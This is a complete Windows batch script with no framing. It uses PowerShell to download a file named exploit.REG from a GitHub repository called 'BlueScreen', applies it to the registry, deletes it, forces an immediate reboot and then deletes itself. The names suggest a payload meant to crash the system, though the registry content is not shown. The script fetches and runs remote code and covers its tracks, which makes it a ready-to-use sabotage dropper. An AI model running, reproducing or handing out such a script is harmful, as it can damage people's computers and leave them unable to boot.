@echo off
powershell /c wget https://raw.githubusercontent.com/harryaldwithjarryald/BlueScreen/main/exploit.REG -OutFile temp.REG
temp.REG
del temp.REG
shutdown -r -t 1
del online_temp.bat
